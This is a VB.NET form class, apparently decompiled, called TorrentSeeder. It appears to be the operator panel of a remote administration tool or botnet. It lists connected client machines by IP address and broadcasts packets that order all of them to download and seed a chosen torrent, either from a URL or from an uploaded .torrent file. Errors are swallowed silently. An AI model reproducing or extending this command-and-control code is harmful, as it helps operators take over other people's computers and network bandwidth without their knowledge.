Imports ComponentOwl.BetterListView
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class TorrentSeeder
    Public Sub New()
        Me.clients = New ArrayList
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Dim num2 As Integer = (Me.clients.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            DirectCast(Me.clients.Item(i), ServerClient).Send(data)
            i += 1
        Loop
    End Sub

    Private Sub StartSeedingFileFromServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartSeedingFileFromServerToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Please enter a valid direct url to a file you want to seed!", "Seeder", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                If (Strings.Right(str, 8) <> ".torrent") Then
                    MessageBox.Show("Please enter a valid direct url!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Else
                    Dim enumerator As IEnumerator(Of BetterListViewItem)
                    Me.SendPacket(New Object() {CByte(&H86), str})
                    Try
                        enumerator = Me.LV_Clients.Items.GetEnumerator
                        Do While enumerator.MoveNext
                            Dim current As BetterListViewItem = enumerator.Current
                            current.SubItems.Item(1).Text = ("Seeding...")
                        Loop
                    Finally
                        If (Not enumerator Is Nothing) Then
                            enumerator.Dispose()
                        End If
                    End Try
                End If
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub StartSeedingFromLocalFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartSeedingFromLocalFileToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator(Of BetterListViewItem)
            Using dialog As OpenFileDialog = New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.Multiselect = False
                dialog2.Filter = "Torrent Files | *.torrent"
                dialog2.Title = "Select any file to seed!"
                If (dialog2.ShowDialog = DialogResult.OK) Then
                    Me.SendPacket(New Object() {CByte(&H85), File.ReadAllBytes(dialog.FileName), New FileInfo(dialog.FileName).Name})
                End If
                dialog2 = Nothing
            End Using
            Try
                enumerator = Me.LV_Clients.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As BetterListViewItem = enumerator.Current
                    current.SubItems.Item(1).Text = ("Seeding...")
                Loop
            Finally
                If (Not enumerator Is Nothing) Then
                    enumerator.Dispose()
                End If
            End Try
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub TorrentSeeder_Load(sender As Object, e As EventArgs) Handles Me.Load
        Dim num2 As Integer = (Me.clients.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            Me.LV_Clients.Items.Add(NewLateBinding.LateGet(NewLateBinding.LateGet(Me.clients.Item(i), Nothing, "EndPoint", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Address", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString).SubItems.Add("Idle...")
            i += 1
        Loop
    End Sub

    Public clients As ArrayList
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        StartTorrentSeederLocal = &H85
        StartTorrentSeederURL = &H86
    End Enum
End Class